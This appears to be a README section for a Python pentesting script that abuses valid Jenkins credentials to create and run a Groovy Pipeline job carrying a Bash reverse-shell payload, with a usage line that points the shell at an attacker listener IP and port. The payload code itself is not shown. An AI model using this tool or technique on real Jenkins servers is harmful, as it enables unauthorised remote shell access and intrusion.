## linux_revshell_groovy.py
This script is useful when you have valid credentials and want to check if it can be use to spawn a reverse shell.\
The Jenkins server must be installed on Linux.\
And Jenkins must have the "[workflow-cps](https://plugins.jenkins.io/workflow-cps/)" or "Pipeline: Groovy" plugin installed.\
To be able to receive a reverse shell, the user must have BUILD and JOB CREATION privileges.\
Once logged in on Jenkins, the script creates a new **"Pipeline"** JOB.

![linux_revshell_groovy_1](https://github.com/stevenvegar/Jenkins_scripts/blob/main/linux_revshell_groovy.py/images/linux_revshell_groovy_1.png)

Then configures it or BUILD a **"Pipeline script"** with the **Bash** payload as **Groovy** code.
![linux_revshell_groovy_2](https://github.com/stevenvegar/Jenkins_scripts/blob/main/linux_revshell_groovy.py/images/linux_revshell_groovy_2.png)

Finally, the script sends the instruction to execute this JOB.

USAGE:\
python3 ./linux_revshell_groovy.py -w URL -r LOCAL_IP -rp LOCAL_PORT
![linux_revshell_groovy_3](https://github.com/stevenvegar/Jenkins_scripts/blob/main/linux_revshell_groovy.py/images/linux_revshell_groovy_3.png)
![linux_revshell_groovy_4](https://github.com/stevenvegar/Jenkins_scripts/blob/main/linux_revshell_groovy.py/images/linux_revshell_groovy_4.png)

Tested on Jenkins 2.150.2 on Ubuntu Server 22.04.3 LTS
